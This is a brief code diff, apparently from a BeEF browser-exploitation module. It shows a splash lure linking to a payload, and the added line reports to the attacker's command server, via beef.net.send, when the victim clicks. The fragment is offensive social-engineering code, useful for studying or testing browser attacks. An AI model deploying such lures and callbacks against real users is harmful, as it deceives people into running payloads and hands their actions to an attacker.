@@ -28,5 +28,6 @@ beef.execute(function() {
 	div.innerHTML= '<a href=\'' + payload + '\' ><img src=\''+ image +'\'  /></a>';
     $j("#splash").click(function () {
       $j(this).hide();
+      beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer=user has accepted');
     });
 });
